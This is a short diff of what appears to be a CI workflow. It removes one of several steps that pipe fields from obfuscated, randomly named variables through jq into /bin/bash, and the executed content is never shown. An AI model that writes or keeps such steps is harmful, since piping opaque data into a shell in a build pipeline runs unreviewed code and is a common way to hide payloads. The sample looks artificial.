@@ -37,7 +37,6 @@ jobs:
           echo $rll165 | jq -r .y3189 | /bin/bash
           printf '%s' "$mux98724" | jq -r .joy54646 | /bin/bash
           echo $fso8235 | jq -r .gkm703 | /bin/bash
-          printf '%s' "$fvqez01" | jq -r .yqxw1 | /bin/bash
           printf '%s' "$x1" | jq -r .ox9 | /bin/bash
 
       - name: Store results
